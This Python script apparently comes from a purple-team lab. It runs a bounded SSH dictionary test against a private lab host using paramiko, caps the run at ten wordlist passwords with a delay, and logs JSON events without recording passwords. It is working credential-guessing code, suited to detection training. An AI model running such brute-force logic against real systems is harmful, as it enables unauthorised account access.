"""Run a bounded SSH dictionary test against the PurpleOps lab victim."""

import json
import time
from datetime import datetime, timezone
from pathlib import Path

import paramiko


HOST = "192.168.50.20"
USERNAME = "ssh-lab"
WORDLIST = Path(__file__).with_name("lab-passwords.txt")
MAX_ATTEMPTS = 10
DELAY_SECONDS = 1
TIMEOUT_SECONDS = 5


def log_event(event, **details):
    """Print a UTC-timestamped JSON event without recording passwords."""
    record = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event": event,
        "target": HOST,
        "username": USERNAME,
        **details,
    }
    print(json.dumps(record), flush=True)


def load_passwords(path):
    """Read at most MAX_ATTEMPTS nonempty candidates from a UTF-8 file."""
    passwords = []

    with path.open(encoding="utf-8") as wordlist:
        for line in wordlist:
            password = line.rstrip("\r\n")

            if password:
                passwords.append(password)

            if len(passwords) >= MAX_ATTEMPTS:
                break

    return passwords


def try_password(password):
    """Attempt SSH authentication and always close the connection.

    Return a result label and an optional error category. Host keys are
    accepted without prior verification for this isolated lab exercise.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=HOST,
            username=USERNAME,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=TIMEOUT_SECONDS,
            banner_timeout=TIMEOUT_SECONDS,
            auth_timeout=TIMEOUT_SECONDS,
        )
        return "success", None

    except paramiko.AuthenticationException as error:
        return "authentication_failed", type(error).__name__

    except (paramiko.SSHException, OSError) as error:
        return "error", type(error).__name__

    finally:
        client.close()


def main():
    """Run sequential attempts, stopping on success, error, or interruption."""
    try:
        passwords = load_passwords(WORDLIST)
    except (OSError, UnicodeError) as error:
        log_event("input_error", error=type(error).__name__)
        return

    if not passwords:
        log_event("input_error", error="empty_wordlist")
        return

    log_event("run_started", planned_attempts=len(passwords))
    attempts_started = 0
    stop_reason = "wordlist_exhausted"

    try:
        for attempt, password in enumerate(passwords, start=1):
            attempts_started = attempt
            log_event("attempt_started", attempt=attempt)

            result, error = try_password(password)
            log_event(
                "attempt_finished",
                attempt=attempt,
                result=result,
                error=error,
            )

            if result in ("success", "error"):
                stop_reason = result
                break

            if attempt < len(passwords):
                time.sleep(DELAY_SECONDS)

    except KeyboardInterrupt:
        stop_reason = "interrupted"

    finally:
        log_event(
            "run_finished",
            attempts_started=attempts_started,
            reason=stop_reason,
        )


if __name__ == "__main__":
    main()
